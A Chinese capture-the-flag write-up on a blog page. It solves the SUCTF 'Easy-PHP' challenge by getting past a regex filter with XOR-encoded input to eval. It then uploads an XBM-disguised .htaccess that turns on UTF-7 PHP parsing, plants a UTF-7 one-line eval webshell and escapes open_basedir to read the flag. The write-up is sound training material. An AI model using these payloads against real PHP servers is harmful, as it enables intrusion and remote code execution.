@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>SUCTF-Easy-PHP笔记 | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+</body></html>
+<header>
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      SUCTF-Easy-PHP笔记
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<p>题目是一个源码审计:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&apos;_&apos;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&apos;One inch long, one inch strong!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&apos;/[\x00- 0-9A-Za-z\&apos;&quot;\`~_&amp;.,|=[\x7F]+/i&apos;, $hhh) )</span><br><span class="line">    die(&apos;Try something else!&apos;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><ul>
+<li><p>对GET传入字符做出了长度限制不得超过18,使用一个正则过滤了<code>自然数、英文字符,x00,X7F,反引号,&quot;,&#39;,_,&amp;,.,逗号</code>。</p>
+</li>
+<li><p><code>count_chars(string,3)</code>取出不同字符的个数，并且设置不得大于12个。最后<code>eval()</code>执行。按照题目的意思是要构造一个能够调用<code>get_the_flag()</code>上面这个自定义函数的方法，上传shell.</p>
+</li>
+<li><p>绕过get_the_flag()直接使用<code>.htaccess</code>方法执行php</p>
+</li>
+</ul>
+<h4 id="绕过限制执行任意函数"><a href="#绕过限制执行任意函数" class="headerlink" title="绕过限制执行任意函数"></a>绕过限制执行任意函数</h4><ul>
+<li><p>这里参考了一篇文章：<a href="https://xz.aliyun.com/t/5677#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-9</a></p>
+</li>
+<li><p>使用<code>0xff</code>异或得到<code>=&gt;_GET</code>进行调用这里写了个脚本对这个结果进行爆破:</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bypass</span><span class="params">()</span>:</span></span><br><span class="line">    minn = <span class="number">1000000000</span></span><br><span class="line">    G = []</span><br><span class="line">    E = []</span><br><span class="line">    T = []</span><br><span class="line">    _ = []</span><br><span class="line">    str_1 = <span class="string">r'\'"`~_&amp;.,|=[0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">    str_2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_1:</span><br><span class="line">        str_2.append(ord(i))</span><br><span class="line">    str_3=<span class="string">'0123456789abcdef'</span><span class="comment">#构造16进制所含字符</span></span><br><span class="line">    str_0x16 = []</span><br><span class="line">    <span class="string">'''构造16进制'''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_3:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_3:</span><br><span class="line">            tmp =  <span class="string">'0x'</span>+i+j</span><br><span class="line">            str_0x16.append(tmp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_0x16:</span><br><span class="line">        <span class="comment">#for j in str_0x16:</span></span><br><span class="line">            j = <span class="string">"0xff"</span></span><br><span class="line">            tmp_1 = int(i,<span class="number">16</span>)</span><br><span class="line">            tmp_2 = int(<span class="string">"0xff"</span>,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">​</span><br></pre></td></tr></table></figure>
+
+<pre><code>if (tmp_1 in str_2) or (tmp_2 in str_2) or (0&lt;=tmp_1&lt;=32) or (0&lt;=tmp_2&lt;=32) or (tmp_1==127) or (tmp_2==127):
+    continue
+if tmp_1^tmp_2==ord(&apos;G&apos;):
+    print(&apos;G=&gt;&apos;+i+&quot;^&quot;+j)
+if tmp_1^tmp_2==ord(&apos;E&apos;):
+    print(&apos;E=&gt;&apos;+i+&quot;^&quot;+j)
+if tmp_1^tmp_2==ord(&apos;T&apos;):
+    print(&apos;T=&gt;&apos;+i+&quot;^&quot;+j)
+if tmp_1^tmp_2==ord(&apos;_&apos;):
+    print(&apos;_=&gt;&apos;+i+&quot;^&quot;+j)</code></pre><p>bypass()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 输出结果</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">_=&gt;0xa0^0xff</span><br><span class="line">T=&gt;0xab^0xff</span><br><span class="line">G=&gt;0xb8^0xff</span><br><span class="line">E=&gt;0xba^0xff</span><br><span class="line">[Finished in 0.2s]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>那么可以构造payload:</li>
+</ul>
+<figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661474033546.png" alt></p>
+<ul>
+<li>正好拿WEB1的表单作为上传</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Upload Labs<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Upload Labs<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://47.111.59.243:9001/?_=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>upload<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"upload"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过get-the-flag-函数"><a href="#绕过get-the-flag-函数" class="headerlink" title="绕过get_the_flag()函数"></a>绕过<code>get_the_flag()</code>函数</h4><p>  该函数主要过滤了ph文件后缀，但没有过滤其他文件后缀，而文件内容则过滤&lt;?,并且使用<code>exif_imagetype</code>对文件进行了判断是否为图片,考虑php7已经抛弃了<code>&lt;script language=&#39;php&#39;&gt;</code>和&lt;<code>%</code></p>
+<p>  所以可以使用UTF-7进行攻击。即上传<code>.htaccess</code>设置如下代码：</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> 4c11f3876d494218ff327e3ca6ac824f_width 1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> 4c11f3876d494218ff327e3ca6ac824f_height 1337</span></span><br><span class="line">AddType application/x-httpd-php .aaa #将后缀为.aaa的解析为php</span><br><span class="line">php_flag display_errors on #关闭报错</span><br><span class="line">php_flag zend.multibyte <span class="number">1</span></span><br><span class="line">php_value zend.script_encoding <span class="string">"UTF-7"</span> #设置解码UTF<span class="number">-7</span></span><br></pre></td></tr></table></figure>
+
+<p>  绕过<code>exif_imagetype</code>的检测，首先看一下这个函数的文档说明（图1），该函数读取图像的第一个字节，也就是说读取图片文件头，如果这个文件头是PHP自带的常量那么就可以通过检测。PHP常量如（图二）,只能使用xbm图片常量而其他常量都会导致<code>.htaccess</code>无法解析。因为XBM图片使用C代码作为表示，也就是在文件头定义两个常量分别是宽和高。这样既可绕过图片头检测。</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_width 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_height 7</span></span><br></pre></td></tr></table></figure>
+
+<p>  <img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661483646268.png" alt></p>
+<p>  <img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661482481850.png" alt></p>
+<p>这样就成功上传了<code>.htaccess</code>文件，但是构造shell并不能直接上传因为过滤&lt;?，但是我们上面设置了解码<code>UTF-7</code>，那么我们就可以构造<code>UTF-7</code>编码的payload(<a href="http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7</a>).</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661488438097.png" alt></p>
+<ul>
+<li><p>UTF-7一句话木马</p>
+<p>我们将木马同样上传上去，注意后缀为.aaa直接上菜刀连接。</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define 4c11f3876d494218ff327e3ca6ac824f_width 1337</span><br><span class="line">#define 4c11f3876d494218ff327e3ca6ac824f_height 1337</span><br><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&apos;a&apos;+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661494271641.png" alt></p>
+<p>也可以使用phpinfo进行测试是否执行成功代码。</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661495566481.png" alt></p>
+<h4 id="open-basedir绕过bypass"><a href="#open-basedir绕过bypass" class="headerlink" title="open_basedir绕过bypass"></a>open_basedir绕过bypass</h4><p>  <code>open_basedir</code>是php.ini中对目录进行授权的设置，使用菜刀连上后发现无法访问其他目录。所以考虑bypass<code>open_basedir</code>,这是一个外国大佬在今年四月份放出来的payload，具体原理我也不懂（—_—）.</p>
+<p>  新建一个php文件，写入如下代码即可列出任意目录文件列表。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/tmp'</span>);</span><br><span class="line">mkdir(<span class="string">'/tmp/fuck/'</span>);</span><br><span class="line">chdir(<span class="string">'/tmp/fuck/'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line">var_dump(scandir(<span class="string">'/'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到flag文件名直接将<code>scandir</code>改成<code>file_get_contents()</code>读取flag</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661500221290.png" alt></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/tmp'</span>);</span><br><span class="line">mkdir(<span class="string">'/tmp/fuck/'</span>);</span><br><span class="line">chdir(<span class="string">'/tmp/fuck/'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line">var_dump(file_get_contents()(<span class="string">'THis_Is_tHe_F14g'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190819/15661918208968.png" alt></p>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-08-25T09:51:44.000Z" itemprop="datePublished">2019-08-25</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="Easy-PHP-Write-up" data-title="SUCTF-Easy-PHP笔记" data-url="http://www.plasf.cn/2019/08/25/Easy-PHP-Write-up/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	</body>
+</html>
